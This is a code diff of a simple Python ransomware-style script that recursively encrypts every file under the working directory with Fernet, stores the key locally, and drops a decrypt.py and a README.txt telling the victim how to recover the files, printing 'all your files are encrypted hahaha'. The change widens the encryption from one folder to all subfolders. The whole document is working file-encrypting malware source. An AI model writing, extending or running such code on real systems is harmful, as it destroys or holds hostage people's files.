@@ -1,27 +1,30 @@
 import os
 from cryptography.fernet import Fernet
 
-files = []
+myFiles = []
 isKey = False
 
-for file in os.listdir():
-    if file == "encrypt.py" or file == "decrypt.py":
-        continue
-    if os.path.isfile(file):
-        files.append(file)
+for path, subdirs, files in os.walk("."):
+    for name in files:
+        strFile = str(os.path.join(path, name))
+        if os.path.isfile(strFile):
+            if strFile == "./encrypt.py" or strFile == "./decrypt.py":
+                continue
+            else:
+                myFiles.append(strFile)
 
-if "key.key" not in files:
+if "key.key" not in myFiles:
     key = Fernet.generate_key()
     with open("key.key", "wb") as encKey:
         encKey.write(key)
 else:
     with open("key.key", "rb") as encKey:
         key = encKey.read()
-    files.remove("key.key")
+    myFiles.remove("key.key")
 
 
 
-for file in files:
+for file in myFiles:
     with open(file, "rb") as fileData:
         data = fileData.read()
     encodedData = Fernet(key).encrypt(data)
@@ -33,15 +36,20 @@ with open("decrypt.py", "w") as code:
 '''
 import os
 from cryptography.fernet import Fernet
-files = []
+myFiles = []
 with open("key.key", "rb") as encKey:
     key = encKey.read()
-for file in os.listdir():
-    if file == "encrypt.py" or file == "decrypt.py" or file == "key.key" or file == "README.txt":
-        continue
-    if os.path.isfile(file):
-        files.append(file)
-for file in files:
+
+
+for path, subdirs, files in os.walk("."):
+    for name in files:
+        strFile = str(os.path.join(path, name))
+        if os.path.isfile(strFile):
+            if strFile == "./encrypt.py" or strFile == "./decrypt.py" or strFile == "./key.key" or strFile == "./README.txt":
+                continue
+            else:
+                myFiles.append(strFile)
+for file in myFiles:
     with open(file, "rb") as fileData:
         data = fileData.read()
     decodedData = Fernet(key).decrypt(data)
@@ -50,7 +58,7 @@ for file in files:
 os.remove("./key.key")
 os.remove("./README.txt")
 os.remove("./decrypt.py")
-print("YOUR FILES ARE READY FOR YOU SIR")
+print("YOUR myFiles ARE READY FOR YOU SIR")
 '''
     )
 
@@ -58,11 +66,11 @@ with open("README.txt", "w") as read:
     read.write(
 '''
 
-HELLO SO IF YOU WANT TO TAKE YOUR FILES BACK JUST OPEN decrypt.py        
+HELLO SO IF YOU WANT TO TAKE YOUR myFiles BACK JUST OPEN decrypt.py        
         
 '''
     )
 
 print("\n\n")
-print("all your files are encrypted hahaha")
+print("all your myFiles are encrypted hahaha")
 print("NOW go and read README.txt")
